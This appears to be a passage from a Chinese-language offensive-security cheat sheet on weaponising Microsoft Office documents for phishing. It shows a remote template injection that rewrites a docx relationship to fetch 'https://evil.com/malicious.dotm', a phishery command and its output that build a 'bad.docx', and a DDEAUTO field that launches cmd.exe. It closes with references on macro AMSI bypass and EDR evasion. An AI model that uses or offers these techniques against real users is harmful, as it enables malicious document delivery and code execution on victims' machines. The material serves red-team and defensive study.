   <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx" TargetMode="External"/></Relationships>
   ```

   ```xml
   <?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.com/malicious.dotm" TargetMode="External"/></Relationships>
   ```

7. 文件再次压缩并重新命名为.docx。

### 模板注入工具

* https://github.com/JohnWoodman/remoteInjector
* https://github.com/ryhanson/phishery

```ps1
$ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
[+] 打开Word文档：good.docx
[+] 将Word文档模板设置为：https://secure.site.local/docs
[+] 将注入后的Word文档保存到：bad.docx
[*] 注入的Word文档已保存！
```

## DOCX - DDE

* 插入 > 快速部件 > 字段
* 右键单击 > 切换字段代码
* `{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }`

## 参考资料

* [VBA RunPE 第一部分 - itm4n](https://itm4n.github.io/vba-runpe-part1/)
* [VBA RunPE 第二部分 - itm4n](https://itm4n.github.io/vba-runpe-part2/)
* [Office VBA AMSI 揭开恶意宏的面纱 - Microsoft](https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/)
* [绕过VBA的AMSI - Outflank](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/)
* [Evil Clippy MS Office Maldoc Assistant - Outflank](https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/)
* [旧学校邪恶的Excel 4.0宏 XLM - Outflank](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)
* [Excel 4 Macro Generator x86/x64 - bytecod3r](https://bytecod3r.io/excel-4-macro-generator-x86-x64/)
* [VBad - Pepitoh](https://github.com/Pepitoh/VBad)
* [Excel 4.0 Macro Function Reference PDF](https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf)
* [Excel 4.0 宏现在非常热门 - SneekyMonkey](https://www.sneakymonkey.net/2020/06/22/excel-4-0-macros-so-hot-right-now/)
* [使用sharpshooter v2.0的宏和更多内容 - mdsec](https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/)
* [在MS xls被遗忘的角落进一步规避 - malware.pizza](https://malware.pizza/2020/06/19/further-evasion-in-the-forgotten-corners-of-ms-xls/)
* [Excel 4.0宏旧但新 - fsx30](https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9)
* [XLS 4.0宏和盟约 - d-sec](https://d-sec.net/2020/10/24/xls-4-0-macros-and-covenant/)
* [从远程dotm模板注入宏 - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros)
* [使用OLE进行网络钓鱼 - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk)
* [网络钓鱼SLK - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel)绕过恶意宏检测通过打破父子进程关系)
* [PropertyBomb：VBA宏中任意代码执行的老新技术 - Leon Berlin - 2018年5月22日](https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/)
* [堆中的AMSI - rmdavy](https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/)
* [WordAMSIBypass - rmdavy](https://github.com/rmdavy/WordAmsiBypass)
* [解链宏并逃避EDR - Noora Hyvärinen](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)
* [从docx执行远程宏 - RedXORBlue 2018年7月18日](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)
* [一千零一种将你的Shellcode复制到内存中的方法（VBA宏） - X-C3LL - 2021年2月18日](https://adepts.of0x.cc/alternatives-copy-shellcode/)
* [通过ActiveX控件运行宏 - greyhathacker - 2016年9月29日](http://www.greyhathacker.net/?p=948)
* [Excel 4.0宏中使用的反分析技术 - 2021年3月24日 - @Jacob_Pimental](https://www.goggleheadedhacker.com/blog/post/23)
* [你以为你能阻止宏？ - Pieter Ceelen - 2023年4月25日](https://outflank.nl/blog/2023/04/25/so-you-think-you-can-block-macros/)